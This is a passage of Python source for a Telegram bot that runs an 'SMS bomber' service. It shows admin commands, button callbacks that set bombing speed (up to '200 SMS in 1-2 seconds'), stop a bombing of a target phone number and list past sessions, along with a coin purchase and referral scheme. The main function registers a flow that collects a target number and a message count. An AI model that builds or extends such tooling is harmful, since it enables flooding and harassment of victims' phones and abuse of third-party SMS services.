async def create_redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not db.is_admin(user_id):
        await update.message.reply_text("❌ Unauthorized!")
        return
    
    if len(context.args) < 2:
        await update.message.reply_text("❌ Usage: /createredeem <code> <amount>")
        return
    
    code = context.args[0].upper()
    amount = int(context.args[1])
    
    db.create_redeem_code(code, amount, user_id)
    await update.message.reply_text(f"✅ Created redeem code: `{code}` ({amount} coins)")
    db.log_admin_action(user_id, "create_redeem", 0, f"Code: {code}, Amount: {amount}")

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not db.is_admin(user_id):
        await update.message.reply_text("❌ Unauthorized!")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: /broadcast <message>")
        return
    
    msg = " ".join(context.args)
    users = db.get_all_users()
    sent = 0
    
    for u in users:
        try:
            await context.bot.send_message(u[0], f"📢 **ANNOUNCEMENT**\n\n{msg}", parse_mode='Markdown')
            sent += 1
            await asyncio.sleep(0.1)
        except:
            pass
    
    await update.message.reply_text(f"✅ Broadcast sent to {sent} users")
    db.log_admin_action(user_id, "broadcast", 0, f"Sent to {sent} users")

# ============================================================
# CALLBACK HANDLERS
# ============================================================

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    data = query.data
    
    # Send SMS Button - Start Conversation
    if data == "send_sms":
        await send_sms_start(update, context)
        return
    
    # Speed Callbacks
    elif data == "speed_menu":
        await speed_menu(update, context)
        return
    
    elif data == "speed_slow":
        db.set_user_speed(user_id, 'slow')
        await query.edit_message_text(
            "🐢 **Speed set to SLOW!**\n\n"
            "✅ Stable & Safe\n"
            "📱 200 SMS → 10-15 seconds\n\n"
            "Use /speed to change anytime.",
            parse_mode='Markdown'
        )
        return
    
    elif data == "speed_medium":
        db.set_user_speed(user_id, 'medium')
        await query.edit_message_text(
            "⚡ **Speed set to MEDIUM!**\n\n"
            "✅ Balanced Speed\n"
            "📱 200 SMS → 4-6 seconds\n\n"
            "Use /speed to change anytime.",
            parse_mode='Markdown'
        )
        return
    
    elif data == "speed_fast":
        db.set_user_speed(user_id, 'fast')
        await query.edit_message_text(
            "🚀 **Speed set to FAST!**\n\n"
            "✅ Maximum Speed\n"
            "📱 200 SMS → 1-2 seconds\n\n"
            "Use /speed to change anytime.",
            parse_mode='Markdown'
        )
        return
    
    # Stop Callback
    elif data == "stop":
        if user_id in active_bombs and active_bombs[user_id]['active']:
            active_bombs[user_id]['active'] = False
            await query.edit_message_text(
                f"🛑 **Bombing Stopped!**\n\n"
                f"📱 Target: `{active_bombs[user_id]['phone']}`\n"
                f"📊 Remaining: {active_bombs[user_id]['count']} SMS\n\n"
                f"💡 Use /bomb to start again.",
                parse_mode='Markdown'
            )
        else:
            await query.edit_message_text(
                "❌ **No active bombing session found!**",
                parse_mode='Markdown'
            )
        return
    
    # Cancel
    elif data == "cancel_bomb":
        await cancel(update, context)
        return
    
    elif data == "refer":
        code = db.get_referral_code(user_id)
        bot_info = await context.bot.get_me()
        bot_username = bot_info.username
        link = f"https://t.me/{bot_username}?start={code}"
        
        await query.edit_message_text(
            f"👥 **REFERRAL SYSTEM**\n\n"
            f"Your Code: `{code}`\n"
            f"Your Link: {link}\n\n"
            f"💰 You get +{REFERRAL_BONUS} coins per referral!\n"
            f"📊 Total: {db.get_referral_count(user_id)} referrals",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton(
                    "📤 Share Link",
                    url=f"https://t.me/share/url?url={link}&text=🔥%20Join%20the%20Ultimate%20SMS%20Bomber%20Bot!%20Get%20{REFERRAL_BONUS}%20free%20coins!"
                )
            ]])
        )
        return
    
    elif data == "credits":
        bal = db.get_balance(user_id)
        stats = db.get_user_stats(user_id)
        await query.edit_message_text(
            f"💰 **YOUR COINS**\n\n"
            f"Balance: {bal} coins\n"
            f"Total Bombs: {stats['total_bombs'] if stats else 0}\n"
            f"SMS Sent: {stats['total_sms'] if stats else 0}\n"
            f"Referrals: {db.get_referral_count(user_id)}\n"
            f"Total Spent: {stats['total_spent'] if stats else 0}\n\n"
            f"💡 /buy - Purchase more coins\n"
            f"👥 /refer - Get free coins"
        )
        return
    
    elif data == "stats":
        stats = db.get_total_stats()
        active_users = db.get_total_active_users()
        total_bombs = db.get_total_bombs_used()
        total_sms = db.get_total_sms_sent_all()
        
        await query.edit_message_text(
            f"📊 **GLOBAL STATS**\n\n"
            f"👥 Users: {stats['users']}\n"
            f"🔥 Active Bombers: {active_users}\n"
            f"💣 Total Bombs: {total_bombs}\n"
            f"📱 Total SMS: {total_sms}\n"
            f"💰 Coins: {stats['coins']}\n"
            f"👑 Admins: {stats['admins']}\n"
            f"🚫 Banned: {stats['banned']}\n"
            f"📡 APIs: {len(APIS)}"
        )
        return
    
    elif data == "history":
        logs = db.get_bomb_logs(user_id, 10)
        if not logs:
            await query.edit_message_text("📋 No SMS history yet!")
            return
        text = "📋 **LAST 10 BOMBING SESSIONS**\n\n"
        for i, log in enumerate(logs, 1):
            target, sms_count, success, failed, cost, speed, stopped, date = log
            status = "🛑 Stopped" if stopped else "✅ Complete"
            text += f"{i}. 📱 `{target}`\n"
            text += f"   ✅ {success} ❌ {failed} | {sms_count} SMS | {cost} coins\n"
            text += f"   ⚡ {SPEED_SETTINGS.get(speed, SPEED_SETTINGS['slow'])['label']} | {status} | 📅 {date[:10]}\n\n"
        await query.edit_message_text(text, parse_mode='Markdown')
        return
    
    elif data == "buy":
        await buy_credits(update, context)
        await query.delete_message()
        return
    
    elif data == "transfer":
        await query.edit_message_text(
            "🔄 **TRANSFER COINS**\n\n"
            "Usage: `/transfer <user_id> <amount>`\n\n"
            "Example: `/transfer 123456789 50`\n\n"
            "⚠️ You can only transfer to existing users!",
            parse_mode='Markdown'
        )
        return
    
    elif data == "redeem":
        await query.edit_message_text(
            "🎯 **REDEEM CODE**\n\n"
            "Usage: `/redeem <code>`\n\n"
            "Example: `/redeem BOMBER2024`\n\n"
            "📌 Contact admin for redeem codes!",
            parse_mode='Markdown'
        )
        return
    
    elif data == "info":
        await query.edit_message_text(
            f"ℹ️ **{BOT_NAME} INFO**\n\n"
            f"📅 Version: {VERSION}\n"
            f"👑 Owner: {OWNER}\n"
            f"📢 Channels: {CHANNEL1} | {CHANNEL2}\n"
            f"📡 APIs: {len(APIS)}\n"
            f"💰 Pricing: 200→2 | 500→5 | ∞→8\n"
            f"🎁 Free: {FREE_COINS} coins\n"
            f"👥 Referral: +{REFERRAL_BONUS} coins\n"
            f"⏰ Auto-Stop: {AUTO_STOP_MINUTES} min\n\n"
            f"📌 Made with ❤️ by {OWNER}",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📢 Channel 1", url="https://t.me/zenoxtool"),
                 InlineKeyboardButton("📢 Channel 2", url="https://t.me/Dev_Null_X_NODE_JS")],
                [InlineKeyboardButton("👑 Owner", url="https://t.me/lordzenox")]
            ])
        )
        return
    
    elif data == "admin_panel":
        await admin_panel_callback(update, context)
        return
    
    elif data == "full_stats":
        if not db.is_admin(user_id):
            await query.edit_message_text("❌ Unauthorized!")
            return
        stats = db.get_total_stats()
        active_users = db.get_total_active_users()
        total_bombs = db.get_total_bombs_used()
        total_sms = db.get_total_sms_sent_all()
        
        await query.edit_message_text(
            f"📊 **FULL STATS**\n\n"
            f"👥 Users: {stats['users']}\n"
            f"🔥 Active Bombers: {active_users}\n"
            f"💣 Total Bombs: {total_bombs}\n"
            f"📱 Total SMS: {total_sms}\n"
            f"💰 Coins: {stats['coins']}\n"
            f"👑 Admins: {stats['admins']}\n"
            f"🚫 Banned: {stats['banned']}\n"
            f"📡 APIs: {len(APIS)}"
        )
        return
    
    elif data == "admins_list":
        if not db.is_admin(user_id):
            await query.edit_message_text("❌ Unauthorized!")
            return
        admins = db.get_all_admins()
        text = "👑 **ADMINS LIST**\n\n"
        for a in admins:
            text += f"👤 {a[1] or 'User'} - `{a[0]}`\n"
        await query.edit_message_text(text, parse_mode='Markdown')
        return
    
    elif data == "banned_list":
        if not db.is_admin(user_id):
            await query.edit_message_text("❌ Unauthorized!")
            return
        import sqlite3
        conn = sqlite3.connect(db.DB_NAME)
        c = conn.cursor()
        c.execute("SELECT user_id, username, first_name FROM users WHERE is_banned = 1")
        banned = c.fetchall()
        conn.close()
        
        if not banned:
            await query.edit_message_text("🚫 No banned users!")
            return
        
        text = "🚫 **BANNED USERS**\n\n"
        for b in banned:
            text += f"👤 {b[1] or b[2] or 'User'} - `{b[0]}`\n"
        await query.edit_message_text(text, parse_mode='Markdown')
        return
    
    elif data == "back_menu":
        await query.edit_message_text(
            "🔄 **Returning to main menu...**\n\n"
            "Click /start or use /menu"
        )
        return

# ============================================================
# ERROR HANDLER
# ============================================================

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Update {update} caused error {context.error}")
    try:
        if update and update.effective_message:
            await update.effective_message.reply_text(
                "❌ **An error occurred!**\n\n"
                "Please try again later.\n"
                "Contact: @lordzenox",
                parse_mode='Markdown'
            )
    except:
        pass

# ============================================================
# MAIN
# ============================================================

def main():
    try:
        print(f"🚀 Starting {BOT_NAME} {VERSION}...")
        print(f"📡 Loading APIs...")
        print(f"✅ Loaded {len(APIS)} APIs")
        print(f"⚡ Speeds: 🐢 SLOW | ⚡ MEDIUM | 🚀 FAST")
        print(f"🛑 Auto-Stop: {AUTO_STOP_MINUTES} minutes")
        print("=" * 40)
        
        app = Application.builder().token(BOT_TOKEN).build()
        
        # Conversation Handler - Bomb Flow
        conv_handler = ConversationHandler(
            entry_points=[
                CommandHandler("bomb", bomb),
                CallbackQueryHandler(send_sms_start, pattern="^send_sms$"),
            ],
            states={
                PHONE: [
                    MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone),
                    CallbackQueryHandler(cancel, pattern="^cancel_bomb$")
                ],
                SPEED: [
                    CallbackQueryHandler(get_speed, pattern="^speed_"),
                    CallbackQueryHandler(cancel, pattern="^cancel_bomb$"),
                    CallbackQueryHandler(back_to_speed, pattern="^back_to_speed$")
                ],
                COUNT: [
                    CallbackQueryHandler(get_count, pattern="^count_"),
                    CallbackQueryHandler(back_to_count, pattern="^back_to_count$"),
                    CallbackQueryHandler(back_to_speed, pattern="^back_to_speed$"),
                    CallbackQueryHandler(confirm_bomb, pattern="^confirm_bomb$"),
                    CallbackQueryHandler(cancel, pattern="^cancel_bomb$")
                ],
            },
            fallbacks=[
                CommandHandler("cancel", cancel),
                CommandHandler("stop", stop),
                CallbackQueryHandler(cancel, pattern="^cancel_bomb$")
            ],
        )
        
        app.add_handler(conv_handler)
        
        # Other Commands
        app.add_handler(CommandHandler("start", start))
        app.add_handler(CommandHandler("menu", menu))
        app.add_handler(CommandHandler("stop", stop))
        app.add_handler(CommandHandler("speed", speed_menu))
        app.add_handler(CommandHandler("balance", balance))
        app.add_handler(CommandHandler("refer", refer))
        app.add_handler(CommandHandler("leaderboard", leaderboard))
        app.add_handler(CommandHandler("status", status))
        app.add_handler(CommandHandler("help", help_command))
        app.add_handler(CommandHandler("transfer", transfer_credits))
        app.add_handler(CommandHandler("buy", buy_credits))
        app.add_handler(CommandHandler("redeem", redeem_code))
        app.add_handler(CommandHandler("history", history))
        
        # Admin Commands
        app.add_handler(CommandHandler("addcoins", addcoins))
        app.add_handler(CommandHandler("removecoins", removecoins))
        app.add_handler(CommandHandler("ban", ban))
        app.add_handler(CommandHandler("unban", unban))
        app.add_handler(CommandHandler("makeadmin", make_admin))
        app.add_handler(CommandHandler("removeadmin", remove_admin))
        app.add_handler(CommandHandler("createredeem", create_redeem))
        app.add_handler(CommandHandler("broadcast", broadcast))
        
        # Callback
        app.add_handler(CallbackQueryHandler(button_callback))
        
        # Error
        app.add_error_handler(error_handler)
        
        print("✅ Bot Started Successfully!")
        print("=" * 40)
        
        app.run_polling()
        
    except Exception as e:
        print(f"❌ Error starting bot: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
